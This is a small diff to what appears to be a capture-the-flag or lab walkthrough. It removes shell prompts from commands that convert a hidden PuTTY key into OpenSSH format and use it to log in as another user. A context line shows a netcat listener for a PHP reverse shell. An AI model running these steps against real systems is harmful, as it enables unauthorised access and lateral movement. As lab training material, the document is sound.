@@ -37,8 +37,8 @@ nc -lvnp <Match the port in the php file>
 ## Horizontal Escalation Vector 1
 
 puttygen /tmp/.sys_cache/.thumb -O private-openssh -o /tmp/converted_id
-/tmp/.sys_cache$ chmod 600 /tmp/converted_id
-/tmp/.sys_cache$ ssh -i /tmp/converted_id alice@localhost
+chmod 600 /tmp/converted_id
+ssh -i /tmp/converted_id alice@localhost
 
 ## Horizontal Escalation Vector 2
 
